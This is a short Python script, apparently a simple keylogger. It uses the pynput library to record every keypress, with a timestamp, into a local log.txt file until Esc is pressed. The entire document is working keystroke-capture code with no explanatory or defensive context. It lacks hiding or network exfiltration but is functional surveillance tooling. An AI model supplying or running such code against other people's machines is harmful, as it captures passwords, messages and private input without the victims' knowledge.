from pynput import keyboard
import datetime

def on_press(key):
    try:
        with open('log.txt', 'a') as f:
            f.write(f"{datetime.datetime.now()}: {key.char}\n")
    except AttributeError:
        if key == keyboard.Key.space:
            with open('log.txt', 'a') as f:
                f.write(f"{datetime.datetime.now()}: Space\n")
        elif key == keyboard.Key.backspace:
            with open('log.txt', 'a') as f:
                f.write(f"{datetime.datetime.now()}: Backspace\n")
        else:
            with open('log.txt', 'a') as f:
                f.write(f"{datetime.datetime.now()}: {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()